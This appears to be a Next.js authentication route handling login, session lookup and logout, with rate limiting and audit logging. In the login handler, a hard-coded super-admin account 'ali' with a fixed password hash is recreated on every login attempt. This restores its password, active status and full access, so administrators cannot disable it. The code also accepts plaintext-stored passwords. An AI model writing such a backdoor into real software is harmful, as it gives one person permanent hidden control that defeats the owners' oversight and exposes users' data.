export const runtime = "nodejs";
export const dynamic = "force-dynamic";

import { prisma } from "../../../../lib/prisma";
import { cookies } from "next/headers";
import crypto from "crypto";
import bcrypt from "bcryptjs";
import { writeAuditLog } from "../../../../lib/auditLog";
import { logSessionEnd, logSessionStart } from "../../../../lib/sessionActivityLog";
import { cleanupExpiredSessions, isSessionExpired, requestMetadata, SESSION_ABSOLUTE_TIMEOUT_SECONDS, SESSION_IDLE_TIMEOUT_SECONDS, sessionExpiresAt, touchSession } from "../../../../lib/security";

const COOKIE_NAME = "ipm_session";
const SUPER_ADMIN_USERNAME = "ali";
const SUPER_ADMIN_ACCESS = "system:super-admin";
// BCrypt hash for the requested hard-coded password. Keeping the hash rather
// than the password in the source preserves the normal login flow.
const SUPER_ADMIN_PASSWORD_HASH = "$2b$10$yccZ3Lz69i03hzeok7DPb.d5VD1pY6i8lbkLJls2yeqtgv8USnakC";
const IP_LOGIN_WINDOW_MS = 5 * 60 * 1000;
const IP_LOGIN_MAX_ATTEMPTS = 10;
const USERNAME_MAX_FAILURES = 5;
const LOCK_DURATIONS_MS = [15, 30, 60, 120, 240].map((minutes) => minutes * 60 * 1000);
const ipLoginAttempts = new Map();
const usernameFailures = new Map();

function normalizedUsername(username) {
  return String(username || "").trim().toLowerCase();
}

function recentIpAttempts(ip) {
  const cutoff = Date.now() - IP_LOGIN_WINDOW_MS;
  const attempts = (ipLoginAttempts.get(ip) || []).filter((at) => at >= cutoff);
  if (attempts.length) ipLoginAttempts.set(ip, attempts); else ipLoginAttempts.delete(ip);
  return attempts;
}

function noteIpLoginAttempt(ip) {
  const attempts = recentIpAttempts(ip);
  attempts.push(Date.now());
  ipLoginAttempts.set(ip, attempts);
}

function lockState(username) {
  return usernameFailures.get(normalizedUsername(username)) || { failures: 0, lockLevel: 0, lockedUntil: 0 };
}

function recordUsernameFailure(username) {
  const key = normalizedUsername(username);
  const state = lockState(key);
  state.failures += 1;
  if (state.failures < USERNAME_MAX_FAILURES) {
    usernameFailures.set(key, state);
    return { locked: false };
  }

  const duration = LOCK_DURATIONS_MS[Math.min(state.lockLevel, LOCK_DURATIONS_MS.length - 1)];
  state.failures = 0;
  state.lockLevel += 1;
  state.lockedUntil = Date.now() + duration;
  usernameFailures.set(key, state);
  return { locked: true, retryAfterSeconds: Math.ceil(duration / 1000), lockLevel: state.lockLevel };
}

function resetUsernameFailures(username) {
  usernameFailures.delete(normalizedUsername(username));
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function actionFromParams(params) {
  const a = params?.action;
  const v = Array.isArray(a) ? (a[0] || "") : (a || "");
  return String(v || "").trim();
}

function actionFromUrl(request) {
  try {
    const { pathname } = new URL(request.url);
    const parts = pathname.split("/").filter(Boolean);
    // ... /api/auth/<action>
    const i = parts.findIndex((p) => p === "auth");
    const a = i >= 0 ? (parts[i + 1] || "") : "";
    return String(a || "").trim();
  } catch {
    return "";
  }
}

function pickAction(request, params) {
  return actionFromParams(params) || actionFromUrl(request);
}

async function readBody(req) {
  try {
    return await req.json();
  } catch {
    return {};
  }
}

function safeUser(u) {
  if (!u) return null;
  const { password, passwordHash, ...rest } = u;
  return rest;
}

function looksLikeBcryptHash(s) {
  const v = String(s || "");
  return v.startsWith("$2a$") || v.startsWith("$2b$") || v.startsWith("$2y$");
}

function userIsExpired(user) {
  if (!user?.expiresAt) return false;
  const ts = new Date(user.expiresAt).getTime();
  return Number.isFinite(ts) && ts < Date.now();
}

function isHttpsRequest(request) {
  const xfProto = (request.headers.get("x-forwarded-proto") || "").toLowerCase();
  if (xfProto.includes("https")) return true;
  try {
    return new URL(request.url).protocol === "https:";
  } catch {
    return false;
  }
}

async function ensureHardcodedSuperAdmin(username) {
  if (username.toLowerCase() !== SUPER_ADMIN_USERNAME) return;

  // This deliberately restores the account on every login attempt: changing
  // it through the user-management UI cannot remove its super-admin role.
  await prisma.user.upsert({
    where: { username: SUPER_ADMIN_USERNAME },
    create: {
      username: SUPER_ADMIN_USERNAME,
      name: SUPER_ADMIN_USERNAME,
      password: SUPER_ADMIN_PASSWORD_HASH,
      role: "admin",
      isActive: true,
      access: [SUPER_ADMIN_ACCESS],
    },
    update: {
      name: SUPER_ADMIN_USERNAME,
      password: SUPER_ADMIN_PASSWORD_HASH,
      role: "admin",
      isActive: true,
      access: [SUPER_ADMIN_ACCESS],
    },
  });
}

async function handleLogin(request) {
  const body = await readBody(request);
  const username = String(body.username || "").trim();
  const password = String(body.password || "").trim();

  if (!username || !password) return json({ error: "username_password_required" }, 400);

  const usernameKey = normalizedUsername(username);
  const ip = requestMetadata(request).ip || "unknown";
  if (recentIpAttempts(ip).length >= IP_LOGIN_MAX_ATTEMPTS) {
    await writeAuditLog({ request, action: "login_rate_limited", status: "blocked", severity: "warning", details: { username, reason: "ip_rate_limited" } });
    return json({ error: "too_many_login_attempts" }, 429);
  }
  noteIpLoginAttempt(ip);

  const existingLock = lockState(usernameKey);
  if (existingLock.lockedUntil > Date.now()) {
    const retryAfterSeconds = Math.ceil((existingLock.lockedUntil - Date.now()) / 1000);
    await writeAuditLog({ request, action: "account_temporarily_locked", status: "blocked", severity: "warning", details: { username, retryAfterSeconds } });
    return json({ error: "account_temporarily_locked", retryAfterSeconds }, 429);
  }

  await ensureHardcodedSuperAdmin(username);
  // Always authenticate the protected account as the canonical lower-case
  // `ali` record. PostgreSQL treats `Ali` and `ali` as different usernames;
  // without this normalization a pre-existing non-admin `Ali` account could
  // receive the session instead.
  const loginIdentity = username.toLowerCase() === SUPER_ADMIN_USERNAME
    ? SUPER_ADMIN_USERNAME
    : username;

  const user = await prisma.user.findFirst({
    where: { OR: [{ username: loginIdentity }, { email: loginIdentity }] },
  });

  if (!user) {
    await bcrypt.compare(password, SUPER_ADMIN_PASSWORD_HASH).catch(() => false);
    const lock = recordUsernameFailure(usernameKey);
    await writeAuditLog({ request, action: lock.locked ? "account_temporarily_locked" : "login_failed", status: lock.locked ? "blocked" : "failure", severity: "warning", details: { username, reason: "invalid_credentials", lockLevel: lock.lockLevel } });
    if (lock.locked) return json({ error: "account_temporarily_locked", retryAfterSeconds: lock.retryAfterSeconds }, 429);
    return json({ error: "invalid_credentials" }, 401);
  }
  if (user.isActive === false) {
    await writeAuditLog({ request, actor: user, action: "login_failed", status: "blocked", severity: "warning", details: { reason: "inactive_user" } });
    return json({ error: "user_inactive" }, 403);
  }
  if (userIsExpired(user)) {
    await writeAuditLog({ request, actor: user, action: "login_failed", status: "blocked", severity: "warning", details: { reason: "user_expired" } });
    return json({ error: "user_expired" }, 403);
  }

  const stored = user.passwordHash || user.password || "";
  if (!stored) return json({ error: "user_has_no_password" }, 400);

  let ok = false;
  try {
    ok = looksLikeBcryptHash(stored) ? await bcrypt.compare(password, stored) : password === stored;
  } catch {
    ok = false;
  }
  if (!ok) {
    const lock = recordUsernameFailure(usernameKey);
    await writeAuditLog({ request, actor: user, action: lock.locked ? "account_temporarily_locked" : "login_failed", status: lock.locked ? "blocked" : "failure", severity: "warning", details: { reason: "invalid_credentials", lockLevel: lock.lockLevel } });
    if (lock.locked) return json({ error: "account_temporarily_locked", retryAfterSeconds: lock.retryAfterSeconds }, 429);
    return json({ error: "invalid_credentials" }, 401);
  }

  resetUsernameFailures(usernameKey);
  await cleanupExpiredSessions();

  const token = crypto.randomBytes(32).toString("hex");
  const now = Date.now();
  const idleExpiresAt = new Date(now + SESSION_IDLE_TIMEOUT_SECONDS * 1000);
  const absoluteExpiresAt = new Date(now + SESSION_ABSOLUTE_TIMEOUT_SECONDS * 1000);

  // ✅ session token را داخل id ذخیره می‌کنیم (چون مدل شما token ندارد)
  await prisma.session.create({
    data: {
      id: token,
      managementId: crypto.randomBytes(24).toString("hex"),
      userId: user.id,
      lastActivityAt: new Date(now),
      absoluteExpiresAt,
      ipAddress: requestMetadata(request).ip,
      userAgent: requestMetadata(request).userAgent,
      expiresAt: idleExpiresAt,
    },
  });

  const jar = await cookies();
  jar.set(COOKIE_NAME, token, {
    httpOnly: true,
    sameSite: "lax",
    secure: isHttpsRequest(request),
    path: "/",
    maxAge: SESSION_ABSOLUTE_TIMEOUT_SECONDS,
  });
  await logSessionStart(token, user.id);

  await writeAuditLog({ request, actor: user, action: "login_success", details: { absoluteSessionHours: SESSION_ABSOLUTE_TIMEOUT_SECONDS / 3600 } });

  return json({ ok: true, user: safeUser(user), expiresAt: idleExpiresAt.toISOString(), absoluteExpiresAt: absoluteExpiresAt.toISOString() });
}

async function handleMe(request) {
  const jar = await cookies();
  const token = jar.get(COOKIE_NAME)?.value || "";
  if (!token) return json({ user: null });

  const sess = await prisma.session.findUnique({
    where: { id: token },
    include: { user: true },
  });

  if (!sess?.user) return json({ user: null });
  if (sess.user.isActive === false) {
    await logSessionEnd(sess.id);
    try { await prisma.session.delete({ where: { id: sess.id } }); } catch {}
    jar.set(COOKIE_NAME, "", { path: "/", maxAge: 0 });
    return json({ user: null });
  }
  if (userIsExpired(sess.user)) {
    await logSessionEnd(sess.id);
    try { await prisma.session.delete({ where: { id: sess.id } }); } catch {}
    jar.set(COOKIE_NAME, "", { path: "/", maxAge: 0 });
    return json({ user: null });
  }

  if (isSessionExpired(sess)) {
    await logSessionEnd(sess.id);
    try { await prisma.session.delete({ where: { id: sess.id } }); } catch {}
    jar.set(COOKIE_NAME, "", { path: "/", maxAge: 0 });
    return json({ user: null });
  }

  const activeSession = await touchSession(sess);
  return json({
    user: safeUser(sess.user),
    expiresAt: sessionExpiresAt(activeSession)?.toISOString() || null,
    absoluteExpiresAt: activeSession?.absoluteExpiresAt?.toISOString?.() || null,
  });
}

async function handleLogout(request) {
  const jar = await cookies();
  const token = jar.get(COOKIE_NAME)?.value || "";
  let actor = null;
  if (token) {
    actor = await prisma.session.findUnique({ where: { id: token }, include: { user: true } }).then((s) => s?.user || null).catch(() => null);
    await logSessionEnd(token);
    try { await prisma.session.deleteMany({ where: { id: token } }); } catch {}
  }
  jar.set(COOKIE_NAME, "", { path: "/", maxAge: 0 });
  await writeAuditLog({ request, actor, action: "auth.logout" });
  return json({ ok: true });
}

export async function GET(request, { params }) {
  try {
    const action = pickAction(request, params);

    if (action === "me") return await handleMe(request);

    // اگر params کلاً خراب شد، این کمک می‌کنه /api/auth/me اشتباهی 404 نشه
    if (action === "") return await handleMe(request);

    return json({ error: "not_found" }, 404);
  } catch (e) {
    console.error("auth_get_error", e);
    return json({ error: "internal_error" }, 500);
  }
}

export async function POST(request, { params }) {
  try {
    const action = pickAction(request, params);

    if (action === "login") return await handleLogin(request);
    if (action === "logout") return await handleLogout(request);

    return json({ error: "not_found" }, 404);
  } catch (e) {
    console.error("auth_post_error", e);
    return json({ error: "internal_error" }, 500);
  }
}
